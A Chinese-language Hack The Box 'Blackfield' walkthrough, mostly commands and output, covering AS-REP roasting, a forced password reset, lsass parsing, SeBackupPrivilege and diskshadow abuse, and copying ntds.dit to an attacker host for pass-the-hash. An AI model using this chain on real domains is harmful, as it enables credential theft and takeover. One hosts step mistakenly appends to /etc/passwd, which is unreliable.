kali 10.10.16.5

靶机 10.10.10.192

[HTB: Blackfield | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell)

```bash
nmap -p- --min-rate 1000 10.10.10.192
nmap -sU -p- --min-rate 1000 10.10.10.192
```

```bash
nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -O -oN nmap.txt 10.10.10.192
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-17 09:20:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=9/16%OT=53%CT=%CU=%PV=Y%G=N%TM=65066364%P=x86_64-pc-linux-gnu)
SEQ(SP=FB%GCD=1%ISR=10E%TI=RD%II=I%TS=U)
OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2023-09-17T09:23:51
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
Final times for host: srtt: 718175 rttvar: 141933  to: 1285907
```



# 53 DNS

```bash
dig @10.10.10.192 blackfield.local
dig axfr @10.10.10.192 blackfield.local
```

得到域名 `blackfield.local`，没有得到子域名

绑定 hosts

```bash
echo '10.10.10.192 blackfield.local dc01.blackfield.local' >> /etc/passwd
```



# 445 SMB

```bash
└─# crackmapexec smb 10.10.10.192
[*] Initializing FTP protocol database
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

```bash
└─# smbmap -H 10.10.10.192 -u null
[+] Guest session   	IP: 10.10.10.192:445	Name: 10.10.10.192                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

连接  `profiles$` 共享文件夹，发现这里有很多空目录，目录名类似于用户名

```bash
└─# smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
................
...............
```

想把它们下载下来，做成用户名字典，但是 mget 失败了

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

于是使用挂载目录的方法：

```bash
└─# mount -t cifs //10.10.10.192/profiles$ /mnt
Password for root@//10.10.10.192/profiles$: 
```

```bash
─# ls -1 /mnt/ > user.list      
```



# AS-REP Roast

之前得到了用户名列表，可以尝试 88 端口的用户名枚举

```bash
└─# ../Desktop/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local user.list 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/16/23 - Ronnie Flathers @ropnop

2023/09/16 22:41:22 >  Using KDC(s):
2023/09/16 22:41:22 >  	10.10.10.192:88

2023/09/16 22:41:48 >  [+] VALID USERNAME:	 audit2020@BLACKFIELD.local
2023/09/16 22:44:14 >  [+] VALID USERNAME:	 support@BLACKFIELD.local
2023/09/16 22:44:15 >  [+] VALID USERNAME:	 svc_backup@BLACKFIELD.local
```

把这些用户名整理为 `user_new.list`



尝试 枚举 不需要进行域身份验证的用户

```bash
└─# for user in $(cat user_new.list); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
$krb5asrep$23$support@BLACKFIELD.LOCAL:15b93a99dfd3dc221c6e82126cdbb97e$842327d6431b7d14066468066440b144b733838ae7acebccdb42b21c3cd95136949782888b45f5c4b87960c749fb917c05328637c4582e721aeef53af98b488683c3276fb7ec99ae6bd304d1c366730d8b1dd130d46b4d41805e9fa91e139a6e574c9d197d72bfd15eef4f9af55cd5354010fbb03d5ca73f982ab7c9837d275b98c518662eab245ba19184dc0e2c739f1f5665f47248ca1a9cf71f44b31e54b7768d696978bd1620963678fbcb707bbf6cc9d37b5eb6f070c71d1d41bb112b6daaa1894c4ed51079d872e82325b156a08511b7ca9a5ac9aeabc2e38f94ab048d4d732fafde253e30d38bd0cccf21502c5fa14739
```

存入 `svc.asrep.hash`

尝试爆破

```bash
hashcat -m 18200 svc.asrep.hash /usr/share/wordlists/rockyou.txt --force
```

得到一组凭据 ：`support:#00^BlackKnight`



再尝试利用这组凭据得到更多的信息：

winrm：失败，无法远程登录

```bash
crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
```



smb：有信息，但不多

```bash
└─# crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
```

```bash
└─# smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'
[+] IP: 10.10.10.192:445	Name: 10.10.10.192                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
```



ldap：失败

```bash
ldapsearch -H ldap://10.10.10.192 -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
```



ldap：成功

```bash
ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
```

有信息，但是不太好利用



# Kerberoasting

无

```bash
└─# GetUserSPNs.py -request -dc-ip 10.10.10.192 'blackfield.local/support:#00^BlackKnight'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

No entries found!
```



# Bloodhound

延时太高，失败了

```bash
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

<img src=".\图片\Snipaste_2023-09-17_11-20-02.png" alt="Snipaste_2023-09-17_11-20-02" style="zoom:80%;" />



找到一个 更改密码 的手法，support 用户 可以 更改 audit2020 用户的密码 为 `zf1yolo!!!`

[Reset AD user password with Linux :: malicious.link — welcome (room362.com)](https://room362.com/post/2017/reset-ad-user-password-with-linux/)

```bash
└─# rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "zf1yolo!!!"'
```



验证 smb 成功

```bash
└─# crackmapexec smb 10.10.10.192 -u audit2020 -p 'zf1yolo!!!'                                                      
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:zf1yolo!!! 
```



winrm 依旧失败

```bash
crackmapexec winrm 10.10.10.192 -u audit2020 -p 'zf1yolo!!!'
```



# audit2020 用户

smb：

```bash
└─# smbmap -H 10.10.10.192 -u audit2020 -p 'zf1yolo!!!'
[+] IP: 10.10.10.192:445	Name: 10.10.10.192                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
```

```bash
└─# smbclient -U audit2020 //10.10.10.192/forensic                                                                                                            1 ⨯
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

		5102079 blocks of size 4096. 1674232 blocks available
```

得到了很多信息，这里下载 `lsass.zip`，太大了，超时失败

```bash
smb: \memory_analysis\> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
```

看 0xdf 大神

I could move this over to a Windows VM, but there’s a Mimikatz alternative, [pypykatz](https://github.com/skelsec/pypykatz) which will work just fine. I’ll install it with `pip3 install pypykatz`. [This blog](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) has a good section on dumping with `pypykatz` from Linux. It dumps a bunch of information:

```
root@kali# pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP                          
FILE: ======== lsass.DMP =======                          
== LogonSession ==
authentication_id 406458 (633ba)                    
session_id 2
username svc_backup                        
domainname BLACKFIELD                               
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406458
        == MSV ==                          
                Username: svc_backup                      
                Domain: BLACKFIELD   
                LM: NA                              
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None                             
        == SSP [633ba]==             
                username                   
                domainname
                password None
        == Kerberos ==
                Username: svc_backup                      
                Domain: BLACKFIELD.LOCAL   
                Password: None                            
        == WDIGEST [633ba]==                              
                username svc_backup
                domainname BLACKFIELD
                password None
                                                          
== LogonSession ==                                  
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server                                        
logon_time 2020-02-23T17:59:38.218491+00:00                                                                                                                                                                                                
sid S-1-5-96-0-2
...[snip]...
```

得到一组凭证 `svc_backup:9658d1d1dcd9250115e2205d9f48400d`



# svc_backup用户

验证 smb

```bash
└─# crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
```

验证 winrm

```bash
└─# crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```



winrm 登录

```powershell
└─# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

*Evil-WinRM* PS C:\Users\svc_backup\desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```



# svc_backup –> administrator

拿到一个用户时，要看它属于哪些组或者有哪些权限，看能不能利用，不清楚的话就谷歌边查边看

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\desktop> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

`SeBackUpPrivilege` basically allows for full system read

[Backup Operators](https://www.backup4all.com/what-are-backup-operators-kb.html) is a default Windows group that is designed to backup and restore files on the computer using certain methods to read and write all (or most) files on the system.



## Copy-FileSeBackupPrivilege

[This repo](https://github.com/giuliano108/SeBackupPrivilege) has a nice set of PowerShell tools for abusing the `SeBackupPrivilege`. I’ll clone it, and then I’ll need to upload two files to Blackfields:

尝试上传 `SeBackupPrivilegeCmdLets.dll` 与 `SeBackupPrivilegeUtils.dll`，upload 这样上传很可能失败，用 wget 下载

```powershell
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeUtils.dll
```

```powershell
wget -Uri http://10.10.16.5/SeBackupPrivilegeCmdLets.dll -OutFile ./SeBackupPrivilegeCmdLets.dll
```

```
wget -Uri http://10.10.16.5/SeBackupPrivilegeUtils.dll -OutFile ./SeBackupPrivilegeUtils.dll
```

然后导入

```powershell
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
```



我们直接读取会失败，复制再读取会成功

```powershell
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege C:\windows\system32\config\netlogon.dns netlogon.dns
```

```powershell
*Evil-WinRM* PS C:\programdata> type netlogon.dns
2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local. 600 IN CNAME DC01.BLACKFIELD.local.
_ldap._tcp.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.pdc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_ldap._tcp.e57c45dd-3cd9-45b6-95b9-642b2f49c1c4.domains._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_kerberos._tcp.dc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 88 dc01.blackfield.local.
_kerberos._tcp.Default-First-Site-Name._sites.dc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 88 dc01.blackfield.local.
_ldap._tcp.dc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_kerberos._tcp.BLACKFIELD.local. 600 IN SRV 0 100 88 dc01.blackfield.local.
_kerberos._tcp.Default-First-Site-Name._sites.BLACKFIELD.local. 600 IN SRV 0 100 88 dc01.blackfield.local.
_gc._tcp.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_gc._tcp.Default-First-Site-Name._sites.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_kerberos._udp.BLACKFIELD.local. 600 IN SRV 0 100 88 dc01.blackfield.local.
_kpasswd._tcp.BLACKFIELD.local. 600 IN SRV 0 100 464 dc01.blackfield.local.
_kpasswd._udp.BLACKFIELD.local. 600 IN SRV 0 100 464 dc01.blackfield.local.
_ldap._tcp.ForestDnsZones.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.DomainDnsZones.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
BLACKFIELD.local. 600 IN A 10.10.10.192
gc._msdcs.BLACKFIELD.local. 600 IN A 10.10.10.192
ForestDnsZones.BLACKFIELD.local. 600 IN A 10.10.10.192
DomainDnsZones.BLACKFIELD.local. 600 IN A 10.10.10.192
```



这就相当于 本地 任意文件读取了

但是无法读到 域中信息文件 ntds.dit ，因为一直显示正在使用中，被进程给拦了



## DiskShadow

A good way to read the `ntds.dit` file is using [another Microsoft utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), `diskshadow`:

> Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS). By default, Diskshadow uses an interactive command interpreter similar to that of Diskraid or Diskpart. Diskshadow also includes a scriptable mode.

Because my shell is not an interactive desktop, I’ll want to use the scripting mode. It involves just putting `diskshadow` commands in a file, one per line. Pentestlab Blog has a [good breakdown](https://pentestlab.blog/tag/diskshadow/) that includes a section on using `diskshadow`. It’s written as if you have admin and just have to deal with accessing the file, so my strategy will be slightly different.

I’m going to create a file that mounts the c drive as another drive using the VSS. I’ll be able to read files from there that would be locked in c.

[PentestLab blog](https://pentestlab.blog/tag/diskshadow/)

原理大致是挂载目录吧，这样进程一直占用的文件，我们也能读取



kali：

```bash
└─# vim vss.dsh
                                                                                                                                                                  
┌──(root💀kali)-[~/Blackfield]
└─# unix2dos vss.dsh
unix2dos: converting file vss.dsh to DOS format...
                                                                                                                                                                  
┌──(root💀kali)-[~/Blackfield]
└─# cat vss.dsh
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```



靶机：

```powershell
*Evil-WinRM* PS C:\windows\system32> upload vss.dsh c:\programdata\vss.dsh
                                        
Info: Uploading /root/Blackfield/vss.dsh to c:\programdata\vss.dsh 
                                        
Data: 176 bytes of 176 bytes copied 
                                        
Info: Upload successful! 
*Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/17/2023 5:06:10 AM

-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
-> set verbose on
-> add volume c: alias df
-> create

Alias df for shadow ID {369de976-3d85-48d0-b5b0-1baea0f3238c} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c1a2458e-8903-4c61-95b9-b71367ae5fac} set as environment variable.
Inserted file Manifest.xml into .cab file df.cab
Inserted file Dis6A8F.tmp into .cab file df.cab

Querying all shadow copies with the shadow copy set ID {c1a2458e-8903-4c61-95b9-b71367ae5fac}

	* Shadow copy ID = {369de976-3d85-48d0-b5b0-1baea0f3238c}		%df%
		- Shadow copy set: {c1a2458e-8903-4c61-95b9-b71367ae5fac}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 9/17/2023 5:06:12 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %df% z:
-> %df% = {369de976-3d85-48d0-b5b0-1baea0f3238c}
The shadow copy was successfully exposed as z:\.
->
```



## 得到  ntds.dit

kali 开启 smb 共享

```bash
smbserver.py s . -smb2support -username zf1yolo -password zf1yolo
```

靶机连接，传送 ntds.dit 文件，这个过程很慢很慢

```powershell
net use \\10.10.16.5\s /u:zf1yolo zf1yolo
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.16.5\s\ntds.dit
```

看看多大

```bash
└─# la -la | grep ntds
-rwxr-xr-x  1 root root 18874368 Sep 17 02:33 ntds.dit
```

To get hashes out of this, I’ll also need the keys from the `SYSTEM` registry file. I’ll save it with `reg`

```
reg.exe save hklm\system \\10.10.16.5\s\system
```



## Dump Hashes

```bash
secretsdump.py -system system -ntds ntds.dit LOCAL
```



```bash
└─# secretsdump.py -system system -ntds ntds.dit LOCAL > ntds.white
```

```bash
└─# cat ntds.white | grep Admin          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
```



横向

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
4375a629c7c67c8e29db269060c955cb
```


